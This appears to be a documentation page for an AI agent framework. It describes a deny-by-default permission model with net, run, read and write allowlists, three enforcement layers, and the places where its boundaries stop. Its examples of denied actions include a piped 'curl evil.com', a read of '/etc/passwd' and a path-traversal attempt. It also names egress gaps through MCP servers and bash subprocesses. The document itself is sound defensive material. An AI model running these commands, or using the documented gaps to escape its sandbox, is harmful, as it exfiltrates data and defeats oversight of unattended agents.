---
title: "The permission model"
description: "The four permission types, what each one allows and blocks, the three enforcement layers and where the boundaries stop today."
---

A service agent runs at 3am, triggered by a webhook, on a machine nobody is watching.
There is no one to ask "may I run this?", so the question has to be answered before the
agent starts. That is what the `permissions:` block is for: you declare once, in config,
what the agent is allowed to touch, and everything else is denied. There is no prompt at
runtime. When the agent tries something outside its grants, the denial goes back to it as
an ordinary tool result and it carries on with that as context for its next turn.

The default is deny. An agent with no `permissions:` block can touch nothing, and there
is no way to grant more while the agent is running. Widening a boundary means editing the
file and redeploying, so a capability change gets reviewed and versioned like any other
config change.

## The four permission types

Permissions come in four axes: `net`, `run`, `read` and `write`. Each one is an
allowlist, and each native tool only exists for the agent when its axis grants something.
This means that no unused tool schema takes up context, and there is nothing sitting
there to misuse.

### net: which hosts the agent can call

```yaml
permissions:
  net: [api.github.com, "*.internal.example.com"]
```

With this block, `http_request` can reach `api.github.com` and any subdomain of
`internal.example.com`, such as `mcp.internal.example.com`. A request to any other host
comes back as `permission denied: net access to "evil.com" is not in the agent's
permissions.net allowlist`. The wildcard covers subdomains only; `internal.example.com`
itself needs its own entry. With no `net:` list, the `http_request` tool does not exist
for the agent at all.

### run: which executables the agent can spawn

```yaml
permissions:
  run: [gh, grep]
```

With this block, `run_bash` can execute `gh issue list | grep bug`. The framework does
not trust the shell: it extracts every executable from pipes and chains and checks each
one against the list, so `gh issue list | curl evil.com` is denied because `curl` is
missing from the allowlist. Command substitution (`$(...)`, backticks, `<(...)`) is
rejected outright, because there is no way to check what is inside it before it runs.
Executables are matched by basename, so `/usr/bin/gh` counts as `gh`.

### read and write: which paths the agent can touch

```yaml
permissions:
  read: [/workspace]
  write: [/workspace/out]
```

With this block, `read_file` can open `/workspace/notes.md` and `write_file` can create
`/workspace/out/report.md`. Reading `/etc/passwd` is denied, and so is the traversal
attempt `/workspace/../etc/passwd`, because paths are normalized before the check. Writes
outside `/workspace/out` are denied, including the rest of `/workspace`.

An agent with an empty `permissions:` block carries only `current_time`, plus
`read_skill` if it has [skills](skills.md). The full toolset and what makes each tool
appear is in [Tools](tools.md); syntax, matching rules and secrets are in
[Permissions](permissions.md).

## The three layers

We don't trust any single boundary to hold. Enforcement nests in three layers, and each
layer assumes the one inside it can fail.

1. **The permission engine.** Framework code checks every native tool call against the
   allowlists above, and every decision, allowed and denied, lands in the audit trail.
2. **The Deno sandbox.** The agent process itself is launched with only the rights it
   needs: in the base image, reads scoped to `/agent`, `/skills`, `/data` and
   `/run/secrets`, writes to `/data` and subprocess spawning to `bash` alone. The runtime
   enforces this underneath the framework's own code, so a bug in the framework can't
   grant an access the runtime was never given. `af flags agent.yaml` prints the compiled
   flag set for a config.
3. **The container.** This is the outer wall and the unit of isolation. `bash`
   subprocesses escape the Deno sandbox by design, and the container is what contains
   them. That is also why there is no "run on the host" mode: the framework refuses to
   run where its outermost layer is missing.

Subprocesses and MCP servers receive only the env vars their config block grants, plus
`PATH`/`HOME`, and secret values are injected server side, so they never enter the
model's context.

## Where the boundaries stop today

The model above is honest about its edges, and you should know where they are before you
rely on it.

**An MCP server's network traffic bypasses `permissions.net`.** The engine checks hosts
for the native `http_request` tool; whatever outbound calls an MCP server makes happen
outside it. When you declare a server under `tools.mcp`, you are trusting where it talks
to. Your controls on the tool side are the `include:` filter (a tool you didn't include
does not exist for the agent), the `readonly:` flag and the scoped `env:` block, and
every MCP call lands in the audit trail; the server's own egress is bounded by the
container.

**Network egress is open below the app layer.** The container runs with Deno's network
permission unrestricted, so per-host enforcement happens only in the permission engine.
Anything that runs outside the engine, a `bash` subprocess or an MCP server process, can
reach any host the container can. A `gh` you allowed will talk to whatever it wants. If
egress matters for an agent, restrict it at the container layer with your network
setup.

**The image's sandbox flags are shared.** The published image launches every agent with
the same Deno flag set, and the per-agent compiled flags from `af flags` apply when you
build your own entrypoint. Inside the shipped container, what varies per agent is the
permission engine's allowlists.

**`run` matches by basename.** `run: [gh]` allows any executable named `gh`, wherever it
lives. Inside the hardened base image that is fine in practice; if you derive an image
that widens the writable paths, keep in mind that the container is the backstop.

The result is that you can run an agent unattended and know its worst case in advance:
the agent can reach exactly what its grants say, the runtime and the container hold that
boundary underneath the framework's own code, and the remaining edges are outlined
above. The config itself is hard to get wrong without noticing, because unknown keys are
rejected at load time and anything you leave out is denied.
